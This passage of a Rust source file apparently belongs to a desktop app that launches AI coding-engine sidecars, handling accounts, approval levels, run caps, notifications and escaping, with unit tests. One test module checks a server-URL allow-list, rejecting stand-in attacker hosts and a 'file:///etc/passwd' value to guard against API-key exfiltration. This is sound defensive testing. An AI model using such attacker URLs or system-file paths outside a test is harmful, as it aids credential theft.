        let conta_dir = match crate::contas_claude::resolver(&contas, account_id) {
            Ok(d) => d,
            Err(e) => {
                return reply(
                    window,
                    req,
                    false,
                    serde_json::json!({ "error": e.mensagem(), "codigo": e.codigo() }),
                )
            }
        };
        crate::contas_claude::aplicar(&mut cmd, conta_dir.as_ref());
        resolvida = contas
            .iter()
            .find(|c| c.id == if account_id.trim().is_empty() { crate::contas_claude::PADRAO } else { account_id.trim() })
            .map(|c| (c.id.clone(), c.rotulo.clone()));
        let do_claude = v.get("modelDoClaude").and_then(|x| x.as_bool()).unwrap_or(false);
        if do_claude && !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if do_claude && !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        // Aprovação NÃO depende de `modelDoClaude`: os níveis são os mesmos dos
        // dois motores (manual/edit/auto), implementados por código nosso — o
        // hook `PreToolUse` do runner, que é quem faz o cartão de aprovação
        // aparecer. Não há catálogo a conciliar aqui, então o valor passa direto.
        let aprovacao = s("approval");
        if !aprovacao.is_empty() {
            cmd.args(["--aprovacao", &aprovacao]);
        }
        // A Run (RUN-20260910, B3): the page arms the stop handshake and the caps. Only
        // the Claude runner knows these flags today; `anna` and the Codex runner continue
        // between turns, from the page, and receive nothing here.
        for a in argumentos_da_run(v.get("autonomy")) {
            cmd.arg(a);
        }
    } else if engine == "codex" {
        if !v.get("modelDoCodex").and_then(|x| x.as_bool()).unwrap_or(false) || model.is_empty() {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": "Carregue o catálogo do Codex antes de enviar." }),
            );
        }
        cmd.args(["--cwd", &dir, "--model", &model]);
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
    } else {
        cmd.arg("--json").args(["--tools", "local"]);
        if !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        if !url.is_empty() {
            cmd.args(["--url", &url]);
        }
        if !key.is_empty() {
            cmd.env("SHVIA_API_KEY", &key); // chave do usuário, repassada pelo web (nunca logada)
        }
    }
    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        // `exe_base`, não "anna" cravado: com o motor Claude ativo a frase nomeava o outro
        // binário, e esta é exatamente a mensagem que aparece quando um perfil de conta não
        // sobe (ADR-033). Mandar quem procura o defeito olhar o motor errado custa a sessão
        // inteira de diagnóstico.
        Err(e) => {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": format!("falha ao iniciar {exe_base}: {e}") }),
            )
        }
    };
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdin = child.stdin.take().expect("stdin piped");

    // Guarda no state, matando um sidecar anterior desta janela (troca de sessão).
    // A geração desta sessão acompanha a thread de stdout (guarda o 'exited').
    let label = window.label().to_string();
    let gen = window.app_handle().state::<Sidecars>().insert(label.clone(), child, stdin);

    // stderr → log do app (nunca a timeline).
    let tag = exe_base.to_string();
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            eprintln!("[{tag}] {line}");
        }
    });

    // stdout NDJSON → evento na página (`_emit`), no main thread (WebKit).
    let win = window.clone();
    let exit_label = label;
    std::thread::spawn(move || {
        let app = win.app_handle().clone();
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if line.trim().is_empty() {
                continue;
            }
            let js = format!("window.__shviaCode&&window.__shviaCode._emit(JSON.parse({}))", js_str(&line));
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
        // stdout fechou → anna saiu. Só sinaliza 'exited' se ESTA geração ainda é a
        // sessão viva da janela; se foi substituída (respawn) ou morta (kill/troca
        // de projeto), fica quieta pra não derrubar a sessão nova que acabou de subir.
        if let Some(codigo) = app.state::<Sidecars>().colher(&exit_label, gen) {
            // O motivo vai junto do evento. `sandbox_nao_confirmado` é estado NOMEADO,
            // não "motor indisponível": o binário existe, respondeu e se recusou a
            // servir porque a garantia dele não vale nesta máquina. Tratar isso como
            // ausência mandaria reinstalar o que já está instalado.
            let motivo = match codigo {
                Some(SAIDA_SANDBOX_NAO_CONFIRMADO) => "sandbox_nao_confirmado",
                Some(0) | None => "fim",
                Some(_) => "erro",
            };
            let js = format!(
                "window.__shviaCode&&window.__shviaCode._emit({{type:'exited',reason:{},code:{}}})",
                js_str(motivo),
                codigo.map_or("null".to_string(), |c| c.to_string()),
            );
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
    });

    // O eco da conta resolvida fecha o laço: a página pediu um id e fica sabendo qual
    // valeu, em vez de supor que o pedido foi obedecido. Não existe evento `ready` neste
    // protocolo (os canais são `_reply`, stderr→log e stdout NDJSON→`_emit`), e inventar um
    // mudaria o `embedding.md`, que é contrato dos DOIS motores — a resposta do `spawn` é
    // o lugar que já existe para isto.
    let mut resposta = serde_json::json!({ "ok": true });
    if let Some((id, rotulo)) = resolvida {
        resposta["accountId"] = serde_json::json!(id);
        resposta["accountLabel"] = serde_json::json!(rotulo);
    }
    reply(window, req, true, resposta);
}

fn send(window: &WebviewWindow, v: &serde_json::Value) -> bool {
    let line = match v.get("payload") {
        Some(p) => serde_json::to_string(p).unwrap_or_default(),
        None => return false,
    };
    window.app_handle().state::<Sidecars>().send_line(window.label(), &line)
}

/// Dispara uma notificação nativa do SO (alertas de preço, ADR-011). Usa só a API
/// Rust do `tauri-plugin-notification` — nenhuma capability é exposta à página
/// remota (mantém o ADR-001). Best-effort: falha (permissão do SO negada, etc.) é
/// silenciosa e nunca afeta a página. `handle_message` já roda na main/UI thread
/// em todos os SOs (WKScriptMessageHandler / WebKitGTK / WebView2), então é seguro
/// mostrar a notificação daqui.
fn notify(window: &WebviewWindow, v: &serde_json::Value) {
    let title = v.get("title").and_then(|x| x.as_str()).unwrap_or("ShvIA");
    let body = v.get("body").and_then(|x| x.as_str()).unwrap_or_default();
    if body.trim().is_empty() {
        return;
    }
    // Neutraliza markup: alguns daemons de notificação freedesktop (Linux)
    // interpretam <b>/<a href> no corpo. O conteúdo é first-party (nome do item
    // que o próprio usuário cadastrou), mas removemos os sinais por precaução.
    let sanitize = |s: &str| s.replace(['<', '>'], " ");
    let _ = window
        .app_handle()
        .notification()
        .builder()
        .title(sanitize(title))
        .body(sanitize(body))
        .show();
}

/// `badge` — contagem de não lidas no ícone do dock/taskbar.
///
/// É a metade do item D8 que o plugin de notificação **permite** fazer. A outra
/// metade — clique na notificação abrindo a tela — NÃO é implementável: o
/// `desktop.rs` do `tauri-plugin-notification` 2.3 expõe só `title`, `body`,
/// `icon`, `sound` e `show`; `register_action_types` e o callback de ação existem
/// apenas no `mobile.rs`. Ver ADR-011.
///
/// Por isso o badge importa mais do que pareceria: sem clique, ele é o único sinal
/// persistente de "tem coisa te esperando" depois que o toast do SO desaparece.
///
/// ## Plataformas
///
/// `set_badge_count` cobre macOS e Linux. No **Windows** é `Unsupported` — lá o
/// caminho é `set_overlay_icon`, que precisa de uma IMAGEM renderizada (o número
/// desenhado num ícone), não de um inteiro. Fica de fora conscientemente: renderizar
/// dígito em `Image` a cada mudança de contagem é trabalho de outra ordem, e o
/// retorno é pequeno perto do resto do D8.
fn badge(window: &WebviewWindow, v: &serde_json::Value) {
    let n = v.get("count").and_then(|x| x.as_i64()).unwrap_or(0);

    // 0 REMOVE o badge (contrato do Tauri: `None` ou `0` limpa). Mandar `Some(0)`
    // deixaria um "0" pendurado no ícone em alguns ambientes.
    let count = if n > 0 { Some(n) } else { None };

    // Erro aqui é silencioso de propósito: badge é enfeite informativo, e um
    // ambiente que não suporta (Windows, alguns WMs de Linux) não é motivo para
    // poluir o log a cada 60 s.
    let _ = window.set_badge_count(count);
}

#[cfg(test)]
mod tests_encerrar {
    #[cfg(unix)]
    use super::{encerrar_com_prazo, Sidecar};
    #[cfg(unix)]
    use std::process::{Command, Stdio};
    #[cfg(unix)]
    use std::time::{Duration, Instant};

    #[cfg(unix)]
    fn sidecar(script: &str, arg: &str) -> Sidecar {
        let mut child = Command::new("sh")
            .args(["-c", script, "sh", arg])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        Sidecar { child, stdin, gen: 1 }
    }

    /// 🔴 1.6.29. "Parar" was SIGKILL: the engine never ran its exit path (the SDK's cleanup of
    /// the `claude` CLI, the Codex runner killing its app-server). An engine that leaves on
    /// `{"type":"exit"}` must get that message and leave on its own, well before the deadline.
    #[cfg(unix)]
    #[test]
    fn motor_que_sabe_sair_recebe_o_pedido_e_sai_sozinho() {
        let marca = std::env::temp_dir().join(format!("shvia-saida-{}", std::process::id()));
        let _ = std::fs::remove_file(&marca);
        let sc = sidecar(r#"while read l; do case "$l" in *exit*) echo pediu > "$1"; exit 0;; esac; done"#, &marca.to_string_lossy());
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_secs(5));
        assert!(t.elapsed() < Duration::from_secs(3), "waited {:?} for an engine that leaves on request", t.elapsed());
        assert_eq!(std::fs::read_to_string(&marca).unwrap_or_default().trim(), "pediu", "the engine never got the exit request");
        let _ = std::fs::remove_file(&marca);
    }

    /// …and one that ignores it is still killed and reaped once the deadline passes.
    #[cfg(unix)]
    #[test]
    fn motor_que_nao_sai_morre_no_prazo() {
        let sc = sidecar("sleep 30", "");
        let pid = sc.child.id();
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(3), "took {:?}", t.elapsed());
        #[cfg(target_os = "linux")]
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists(), "the stubborn engine is still alive (or a zombie)");
        let _ = pid;
    }
}

#[cfg(test)]
mod tests_fora_da_ui {
    // The process tests are unix-only (`sh`); unconditional imports would be unused-import
    // errors under `-D warnings` on Windows — the blind spot 1.6.8 measured.
    #[cfg(unix)]
    use super::{ler_url_com_prazo, saida_com_prazo};
    #[cfg(unix)]
    use std::process::{Command, Stdio};
    #[cfg(unix)]
    use std::time::{Duration, Instant};

    #[cfg(unix)]
    #[test]
    fn processo_que_nao_termina_vira_erro_no_prazo() {
        let mut c = Command::new("sh");
        c.args(["-c", "sleep 30"]);
        let t = Instant::now();
        let r = saida_com_prazo(c, Duration::from_millis(300));
        assert_eq!(r.expect_err("must time out").kind(), std::io::ErrorKind::TimedOut);
        assert!(t.elapsed() < Duration::from_secs(5), "took {:?}", t.elapsed());
    }

    #[cfg(unix)]
    #[test]
    fn processo_que_termina_devolve_as_duas_saidas() {
        let mut c = Command::new("sh");
        c.args(["-c", "echo ok; echo err >&2"]);
        let o = saida_com_prazo(c, Duration::from_secs(10)).unwrap();
        assert!(o.status.success());
        assert_eq!(String::from_utf8_lossy(&o.stdout), "ok\n");
        assert_eq!(String::from_utf8_lossy(&o.stderr), "err\n");
    }

    /// A grandchild that inherits the pipe (a daemon started by an rc file) outlives the child:
    /// reading to EOF would wait for IT. The call must still come back.
    #[cfg(unix)]
    #[test]
    fn neto_que_segura_o_cano_nao_segura_a_chamada() {
        let mut c = Command::new("sh");
        c.args(["-c", "echo ok; sleep 8 &"]);
        let t = Instant::now();
        assert!(saida_com_prazo(c, Duration::from_secs(2)).is_ok());
        assert!(t.elapsed() < Duration::from_secs(6), "took {:?}", t.elapsed());
    }

    /// 🔴 The case that froze the app for good: a URL the extractor does not recognize, then the
    /// CLI's prompt with no newline, waiting for a code. `ler_url` alone blocks on it forever.
    #[cfg(unix)]
    #[test]
    fn url_nao_reconhecida_e_prompt_sem_quebra_desistem_no_prazo() {
        let mut filho = Command::new("sh")
            .args(["-c", "echo 'visit https://example.com/login'; printf 'Paste code here: '; sleep 30"])
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .spawn()
            .unwrap();
        let saida = filho.stdout.take().unwrap();
        let t = Instant::now();
        let r = ler_url_com_prazo(saida, Duration::from_millis(500));
        let _ = filho.kill();
        let _ = filho.wait();
        assert!(r.is_none());
        assert!(t.elapsed() < Duration::from_secs(5), "took {:?}", t.elapsed());
    }

    #[cfg(unix)]
    #[test]
    fn url_de_autorizacao_chega_dentro_do_prazo() {
        let mut filho = Command::new("sh")
            .args(["-c", "echo 'Open https://claude.ai/oauth/authorize?code=x'; sleep 30"])
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .spawn()
            .unwrap();
        let saida = filho.stdout.take().unwrap();
        let r = ler_url_com_prazo(saida, Duration::from_secs(5));
        let _ = filho.kill();
        let _ = filho.wait();
        assert_eq!(r.map(|(u, _)| u).as_deref(), Some("https://claude.ai/oauth/authorize?code=x"));
    }

    /// SOURCE check, declared as such: a unit test cannot drive the WebKit signal that calls
    /// `handle_message`. It guards the decision — every arm that starts a process or walks the
    /// disk goes through `fora_da_ui` — so moving one back onto the UI thread fails here.
    #[test]
    fn bracos_lentos_saem_da_thread_da_interface() {
        let fonte = include_str!("code_bridge.rs");
        let ini = fonte.find(&["pub fn handle", "_message("].concat()).expect("handle_message moved");
        let corpo = &fonte[ini..];
        let despacho = ["fora_da", "_ui("].concat();
        for acao in [
            "gitStatus", "listTree", "gitDiff", "readFile", "codexModels", "claudeAuthStatus",
            "claudeAuthLoginStart", "claudeModels", "claudeRunnerInstall", "claudeAccountsDetect",
            "claudeAccountAdd", "engineStatus",
        ] {
            let chave = format!("\"{acao}\" =>");
            let a = corpo.find(&chave).unwrap_or_else(|| panic!("{acao}: arm not found"));
            let resto = &corpo[a + chave.len()..];
            let fim = resto.find("\n        \"").unwrap_or(resto.len());
            assert!(resto[..fim].contains(&despacho), "{acao} runs on the UI thread");
        }
    }
}

#[cfg(test)]
mod tests_url_servidor {
    use super::url_do_servidor;

    /// O caminho legítimo: o web manda `location.origin` da página do ShvIA.
    #[test]
    fn origens_do_servidor_passam() {
        assert!(url_do_servidor("https://ai.shvia.org"));
        assert!(url_do_servidor("https://ia.shvia.org"));
        assert!(url_do_servidor("https://ia.blue3.com.br"));
    }

    /// `url` viaja junto com SHVIA_API_KEY: um host de fora aqui é exfiltração da
    /// chave do usuário. Nada além do servidor entra, nem por sufixo, nem por
    /// esquema fraco, nem o ápex (que é a landing, em outro IP).
    #[test]
    fn qualquer_outra_coisa_e_rejeitada() {
        assert!(!url_do_servidor("https://coletor.atacante.tld"));
        assert!(!url_do_servidor("https://ai.shvia.org.atacante.tld"));
        assert!(!url_do_servidor("https://shvia.org"));
        assert!(!url_do_servidor("https://evil.shvia.org"));
        assert!(!url_do_servidor("http://ai.shvia.org")); // sem TLS
        assert!(!url_do_servidor("file:///etc/passwd"));
        assert!(!url_do_servidor("nao-e-url"));
        assert!(!url_do_servidor(""));
    }
}

// ── helpers ─────────────────────────────────────────────────────────────────
/// Responde uma requisição da página (`_reply`), no main thread.
pub(crate) fn reply(window: &WebviewWindow, req: &str, ok: bool, data: serde_json::Value) {
    // `data` vai como JSON.parse(<string>) — mesmo caminho seguro do stdout — pra
    // que js_str neutralize aspas e U+2028/2029 (um path/erro com esses chars
    // quebraria o eval se `data` fosse interpolado cru).
    let js = format!(
        "window.__shviaCode&&window.__shviaCode._reply({}, {}, JSON.parse({}))",
        js_str(req),
        ok,
        js_str(&data.to_string())
    );
    let w = window.clone();
    let app = window.app_handle().clone();
    let _ = app.run_on_main_thread(move || {
        let _ = w.eval(&js);
    });
}

/// String → literal JS seguro (escapa aspas/controle; U+2028/2029 são válidos em
/// JSON mas quebram string literal JS).
fn js_str(s: &str) -> String {
    serde_json::to_string(s)
        .unwrap_or_else(|_| "\"\"".into())
        .replace('\u{2028}', "\\u2028")
        .replace('\u{2029}', "\\u2029")
}

#[cfg(test)]
mod tests_run {
    use super::*;

    /// No `autonomy` → no flag. The page of yesterday spawns exactly what it spawned.
    #[test]
    fn sem_autonomy_nenhuma_flag() {
        assert!(argumentos_da_run(None).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!("nao-e-objeto"))).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!({}))).is_empty());
    }

    /// The armed run becomes the three flags the runner reads (`parada.mjs`).
    #[test]
    fn a_run_armada_vira_as_tres_flags() {
        let v = serde_json::json!({ "stopByHost": true, "maxIterations": 100, "maxCostUsd": 5 });
        assert_eq!(
            argumentos_da_run(Some(&v)),
            vec!["--parada", "host", "--teto-iteracoes", "100", "--teto-custo", "5"]
        );
        // A fractional cost keeps its decimals; a fractional iteration count floors.
        let v = serde_json::json!({ "maxIterations": 2.9, "maxCostUsd": 0.5 });
        assert_eq!(argumentos_da_run(Some(&v)), vec!["--teto-iteracoes", "2", "--teto-custo", "0.5"]);
    }

    /// 🔴 An invalid cap is dropped, never coerced to 0: `maxTurns: 0` would end every
    /// turn before it started, with the screen showing a run that "ran".
    #[test]
    fn teto_invalido_nao_vira_flag() {
        let v = serde_json::json!({ "stopByHost": false, "maxIterations": 0, "maxCostUsd": -1 });
        assert!(argumentos_da_run(Some(&v)).is_empty());
        let v = serde_json::json!({ "maxIterations": "cem", "maxCostUsd": "cinco", "stopByHost": "sim" });
        assert!(argumentos_da_run(Some(&v)).is_empty());
    }
}

#[cfg(test)]
// Split out of `tests_motor` in 1.6.41; it moves to sessao.rs with `Sidecars`.
mod tests_colher {
    use super::*;

    /// AO VIVO: o `colher` espera um processo real e devolve o código dele.
    ///
    /// Não é teste de aritmética — é a coreografia que os defeitos desta frente
    /// moraram. Um processo que sai 3 tem de chegar como `Some(Some(3))`, e uma
    /// geração que já não é a viva tem de devolver `None` (senão o respawn derruba a
    /// sessão nova que acabou de subir).
    #[test]
    fn colher_le_o_codigo_de_um_processo_de_verdade() {
        use std::process::Stdio;
        let sc = Sidecars::default();

        let mut filho = Command::new("/bin/sh")
            .args(["-c", "exit 3"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn do /bin/sh");
        let stdin = filho.stdin.take().expect("stdin");
        let gen = sc.insert("janela".into(), filho, stdin);

        assert_eq!(sc.colher("janela", gen), Some(Some(3)), "não leu o código real");
        // Colhido uma vez, some do mapa: a segunda chamada não é a sessão viva.
        assert_eq!(sc.colher("janela", gen), None);
    }

    #[test]
    fn colher_de_geracao_velha_nao_sinaliza() {
        use std::process::Stdio;
        let sc = Sidecars::default();
        let mut f1 = Command::new("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s1 = f1.stdin.take().unwrap();
        let gen_velha = sc.insert("janela".into(), f1, s1);

        let mut f2 = Command::new("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s2 = f2.stdin.take().unwrap();
        let gen_nova = sc.insert("janela".into(), f2, s2);

        // A thread de stdout do sidecar VELHO acorda depois do respawn. Se ela
        // sinalizasse, derrubaria a sessão nova — foi para isso que a geração existe.
        assert_eq!(sc.colher("janela", gen_velha), None, "geração velha sinalizou");
        assert!(sc.colher("janela", gen_nova).is_some());
    }
}
